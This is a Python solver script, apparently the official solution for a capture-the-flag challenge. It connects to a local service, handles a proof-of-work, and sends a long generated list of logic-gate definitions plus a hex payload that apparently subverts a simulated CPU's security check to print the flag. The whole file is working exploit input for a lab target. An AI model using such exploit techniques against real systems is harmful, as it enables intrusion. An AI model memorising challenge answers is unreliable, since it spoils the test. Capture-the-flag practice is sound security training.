#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib.tubes

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
print(r.recvuntil('== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
    handle_pow(r)

r.send(b"""
3
var_1 ins_7 ins_7
3
var_2 ins_6 var_1
3
is_jmp var_2 var_2
3
var_4 ins_7 ins_7
3
var_5 ins_6 ins_6
3
var_6 ins_4 ins_5
3
var_7 var_6 var_6
3
var_8 var_7 var_5
3
var_9 var_8 var_8
3
var_10 var_9 var_4
3
is_add var_10 var_10
3
var_12 ins_7 ins_7
3
var_13 ins_6 ins_6
3
var_14 ins_4 ins_4
3
var_15 var_14 ins_5
3
var_16 var_15 var_15
3
var_17 var_16 var_13
3
var_18 var_17 var_17
3
var_19 var_18 var_12
3
is_store var_19 var_19
3
var_21 ins_7 ins_7
3
var_22 ins_6 ins_6
3
var_23 ins_5 ins_5
3
var_24 ins_4 var_23
3
var_25 var_24 var_24
3
var_26 var_25 var_22
3
var_27 var_26 var_26
3
var_28 var_27 var_21
3
is_load var_28 var_28
3
var_30 ins_7 ins_7
3
var_31 ins_6 ins_6
3
var_32 ins_5 ins_5
3
var_33 ins_4 ins_4
3
var_34 ins_0 ins_1
3
var_35 var_34 var_34
3
var_36 var_35 ins_2
3
var_37 var_36 var_36
3
var_38 var_37 ins_3
3
var_39 var_38 var_38
3
var_40 var_39 var_33
3
var_41 var_40 var_40
3
var_42 var_41 var_32
3
var_43 var_42 var_42
3
var_44 var_43 var_31
3
var_45 var_44 var_44
3
var_46 var_45 var_30
3
is_halt var_46 var_46
3
var_48 ins_7 ins_7
3
var_49 ins_6 ins_6
3
var_50 ins_5 ins_5
3
var_51 ins_4 ins_4
3
var_52 ins_0 ins_0
3
var_53 var_52 ins_1
3
var_54 var_53 var_53
3
var_55 var_54 ins_2
3
var_56 var_55 var_55
3
var_57 var_56 ins_3
3
var_58 var_57 var_57
3
var_59 var_58 var_51
3
var_60 var_59 var_59
3
var_61 var_60 var_50
3
var_62 var_61 var_61
3
var_63 var_62 var_49
3
var_64 var_63 var_63
3
var_65 var_64 var_48
3
is_sysret var_65 var_65
3
var_67 ins_7 ins_7
3
var_68 ins_6 ins_6
3
var_69 ins_5 ins_5
3
var_70 ins_4 ins_4
3
var_71 ins_1 ins_1
3
var_72 var_71 ins_2
3
var_73 var_72 var_72
3
var_74 var_73 ins_3
3
var_75 var_74 var_74
3
var_76 var_75 var_70
3
var_77 var_76 var_76
3
var_78 var_77 var_69
3
var_79 var_78 var_78
3
var_80 var_79 var_68
3
var_81 var_80 var_80
3
var_82 var_81 var_67
3
is_syscall var_82 var_82
3
var_84 ins_7 ins_7
3
var_85 ins_6 ins_6
3
var_86 ins_5 ins_5
3
var_87 ins_4 ins_4
3
var_88 ins_2 ins_2
3
var_89 var_88 ins_3
3
var_90 var_89 var_89
3
var_91 var_90 var_87
3
var_92 var_91 var_91
3
var_93 var_92 var_86
3
var_94 var_93 var_93
3
var_95 var_94 var_85
3
var_96 var_95 var_95
3
var_97 var_96 var_84
3
is_ldi var_97 var_97
3
var_99 ins_7 ins_7
3
var_100 ins_6 ins_6
3
var_101 ins_5 ins_5
3
var_102 ins_4 ins_4
3
var_103 ins_3 ins_3
3
var_104 ins_2 var_103
3
var_105 var_104 var_104
3
var_106 var_105 var_102
3
var_107 var_106 var_106
3
var_108 var_107 var_101
3
var_109 var_108 var_108
3
var_110 var_109 var_100
3
var_111 var_110 var_110
3
var_112 var_111 var_99
3
is_putc var_112 var_112
3
var_114 ins_7 ins_7
3
var_115 ins_6 ins_6
3
var_116 ins_5 ins_5
3
var_117 ins_4 ins_4
3
var_118 ins_3 ins_3
3
var_119 ins_2 ins_2
3
var_120 var_119 var_118
3
var_121 var_120 var_120
3
var_122 var_121 var_117
3
var_123 var_122 var_122
3
var_124 var_123 var_116
3
var_125 var_124 var_124
3
var_126 var_125 var_115
3
var_127 var_126 var_126
3
var_128 var_127 var_114
3
is_rdtsc var_128 var_128

3
var_130 ins_0 ins_0
3
var_131 ins_1 ins_1
3
var_132 r0_7 var_131
3
var_133 var_132 var_132
3
var_134 var_133 var_130
3
cond_0 var_134 var_134
3
var_136 ins_1 ins_1
3
var_137 r1_7 var_136
3
var_138 var_137 var_137
3
var_139 var_138 ins_0
3
cond_1 var_139 var_139
3
var_141 ins_0 ins_0
3
var_142 r2_7 ins_1
3
var_143 var_142 var_142
3
var_144 var_143 var_141
3
cond_2 var_144 var_144
3
var_146 r3_7 ins_1
3
var_147 var_146 var_146
3
var_148 var_147 ins_0
3
cond_3 var_148 var_148

3
var_150 cond_0 cond_0
3
var_151 cond_1 cond_1
3
var_152 cond_2 cond_2
3
var_153 cond_3 cond_3
3
var_154 var_153 var_152
3
var_155 var_154 var_154
3
var_156 var_155 var_151
3
var_157 var_156 var_156
3
var_158 var_157 var_150
3
is_or1n var_158 var_158
3
is_or1 is_or1n is_or1n

3
var_161 is_store is_store

3
var_162 is_store is_store
3
var_163 var_162 var_161
3
is_or2n var_163 var_163
3
is_or2 is_or2n is_or2n
3
var_166 is_or2 is_or1
3
is_and1 var_166 var_166
3
var_168 is_rdtsc is_rdtsc
3
var_169 is_putc is_putc
3
var_170 is_sysret is_sysret
3
var_171 is_and1 is_and1
3
var_172 var_171 var_170
3
var_173 var_172 var_172
3
var_174 var_173 var_169
3
var_175 var_174 var_174
3
var_176 var_175 var_168
3
is_or3n var_176 var_176
3
is_or3 is_or3n is_or3n
3
var_179 is_root_now is_root_now
3
var_180 is_or3 var_179
3
security_exception var_180 var_180

3
troll troll is_load

--- ^ autogenerated

3
ins_7n ins_7 ins_7
3
is_jz ins_7n ins_7n

5
0801 0b80 2c 0902 1b 081488 0c 0801 1c 3c 2c 0805 40 09020a0a0c

""")


print(r.recvuntil(b'CTF{'))
print(r.recvuntil(b'}'))

exit(0)
